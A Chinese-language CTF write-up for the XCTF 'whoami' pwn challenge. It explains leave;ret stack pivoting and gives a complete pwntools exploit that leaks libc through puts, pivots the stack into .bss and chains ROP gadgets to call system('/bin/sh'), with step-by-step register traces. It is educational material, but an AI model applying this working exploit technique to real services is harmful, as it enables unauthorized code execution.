# whoami

[题目](https://adworld.xctf.org.cn/challenges/list?rwNmOdr=1682379539545)

题目给的exp可以直接用……这里本来想调试一下exp的，然而本地环境没弄好，只能浅浅写个补充了。

首先要了解一下main函数末尾的leave;ret到底在干什么。

```
leave
//mov rsp rbp  将rbp指向的地址给rsp
//pop rbp  将rsp指向的地址存放的值赋值给rbp
ret
//pop rip  将esp指向的地址存放的值赋值给rip
```

这道题的溢出字节不够多，只够覆盖rbp和返回地址。这种情况就要使用栈迁移，通常利用两个leave;ret来实现（程序自带一个，我们返回地址自己填一个）。执行过程我写在注释了，当然很可能有误，大家有环境的还是调试最好。

```python
from pwn import *

context.log_level = 'debug'

io = remote('61.147.171.105', 59374)
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s,addr		: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))


bss_addr = 0x601040 #“Else?” 内容读入处
leave_ret = 0x4007d6
rdi_ret = 0x400843
rsi_r15_ret = 0x400841
read_0xf0_ret = 0x4007BB
puts_got = 0x600FC0
puts_plt = 0x400580
read_plt = 0x4005A0

payload1 = b'A'*0x20
payload1 += p64(bss_addr+0xc0) #rbp
payload1 += p64(leave_ret) #返回地址
sa('name:', payload1)

payload2 = b'\x00'*0xc0
payload2 += p64(bss_addr+0x70)
payload2 += p64(rdi_ret)
payload2 += p64(puts_got)
payload2 += p64(puts_plt)

payload2 += p64(read_0xf0_ret)
sa('Else?', payload2)
"""
上述代码的执行情况
第一次leave;ret:
mov rsp rbp
rsp=rbp=原来栈上rbp的值，注意执行到这一步时还没有pop rbp改变rbp的值
pop rbp
rbp=rsp->p64(bss_addr+0xc0)
rsp+8->p64(leave_ret)
pop rip
rip=rsp->p64(leave_ret)
rsp+8->xxx（不重要，栈上接下来的值）
第二次leave;ret:
mov rsp rbp
rsp=rbp=p64(bss_addr+0xc0)
pop rbp
rbp=rsp->p64(bss_addr+0x70) (这块指针小心一点，有点绕)
rsp+8->p64(rdi_ret)
pop rip
rip=rsp->p64(rdi_ret)
rsp+8->p64(puts_got)

开始执行rip->p64(rdi_ret)
pop rdi
rdi=rsp->p64(puts_got)
rsp+8->p64(puts_plt)
pop rip
rip=rsp->p64(puts_plt)
rsp+8->p64(read_0xf0_ret)

泄露puts地址，接下来执行read(0,0x601040,0xf0)，main函数里的一段。这段连着末尾的leave;ret
"""
rl()
libc_base = uu64(rl()) - 527008
lg('libc_base', libc_base)

system_addr = libc_base + 324944
payload3 = b'\x00'*0x70
payload3 += p64(bss_addr+0x308)
payload3 += p64(rdi_ret)
payload3 += p64(0)
payload3 += p64(rsi_r15_ret)
payload3 += p64(bss_addr+0x308)
payload3 += p64(0)
payload3 += p64(read_plt)
payload3 += p64(leave_ret)
sl(payload3)

payload4 = p64(bss_addr+0x400) #这块是栈第二次被迁移的地方
payload4 += p64(rdi_ret)
payload4 += p64(bss_addr+0x308+0x20) #对应b'/bin/sh\x00'所在的地址
payload4 += p64(system_addr)
payload4 += b'/bin/sh\x00'
sl(payload4)
"""
执行main函数里的leave;ret。这里我没有考虑read函数，接下来可能有误，以实际调试为准
mov rsp rbp
rsp=rbp=p64(bss_addr+0x70)
pop rbp
rbp=rsp->p64(bss_addr+0x308)
rsp+8->p64(rdi_ret)
pop rip
rip=rsp->p64(rdi_ret)
rip+8->p64(0)

执行gadget：pop rdi;ret
pop rdi
rdi=rsp->p64(0)
rsp+8->p64(rsi_r15_ret)
pop rip
rip=rsp->p64(rsi_r15_ret)
rsp+8->p64(bss_addr+0x308)

执行gadget：pop rsi ; pop r15 ; ret.这一步我记得64位一次调用多个函数的rop都有，从下面的模拟中也能看出作用，用于调整栈帧。pop什么寄存器不重要，只要把无用的内容pop出去平衡栈就行了
pop rsi
rsi=rsp->p64(bss_addr+0x308)
rsp+8->p64(0)
pop r15
r15=rsp->p64(0)
rsp+8->p64(read_plt)
pop rip
rip=rsp->p64(read_plt)
rsp+8->p64(leave_ret)

执行read(0,bss_addr+0x308,0xf0).用main的read正是为了把rdx设置为0xf0，不然太大了读入太多数据程序直接崩溃。根据wp，接下来是二次栈迁移，因为直接system会爆栈（这个不太懂是啥）。

省略read,从leave;ret开始

mov rsp rbp
rsp=rbp=p64(bss_addr+0x308) 别忘了这块刚刚read已经读入数据了
pop rbp
rbp=rsp->p64(bss_addr+0x400)
rsp+8->p64(rdi_ret)
pop rip
rip=rsp->p64(rdi_ret)
rsp+8->p64(bss_addr+0x308+0x20) /bin/sh

执行gadget:pop rdi;ret
pop rdi
rdi=rsp->p64(bss_addr+0x308+0x20)
rsp+8->p64(system_addr)
pop rip
rip=rsp->p64(system_addr)

getshell
"""

irt()
```

栈迁移忘得差不多了，复习后才把过程搞明白。这是另一道相同知识点的[题](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN.md)，比这道简单，可以练练手。